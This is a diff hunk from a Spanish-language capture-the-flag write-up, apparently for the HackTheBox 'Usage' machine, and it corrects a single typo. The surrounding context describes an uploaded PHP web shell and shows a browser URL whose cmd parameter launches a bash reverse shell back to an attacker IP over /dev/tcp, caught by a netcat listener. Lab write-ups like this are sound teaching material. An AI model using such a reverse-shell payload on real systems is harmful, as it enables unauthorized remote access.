@@ -197,7 +197,7 @@ Realizamos una prueba de concepto, intentando ejecutar el comando id, y vemos qu
     <img src="imagenes/usage_8.png" alt="usage_8" width="500"  />
 </p>
 
-En los siguientes pasos intentaremos ganar acceso a la máquina con una reverse shell. Para ello, nos ponemos en ecucha con netcat en nuestra máquina de atacante y ejecutamos la siguiente llamada en el navegador.
+En los siguientes pasos intentaremos ganar acceso a la máquina con una reverse shell. Para ello, nos ponemos en escucha con netcat en nuestra máquina de atacante y ejecutamos la siguiente llamada en el navegador.
 ```bash
 http://admin.usage.htb/uploads/images/pwned.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.10/443 0>%261'
 ```
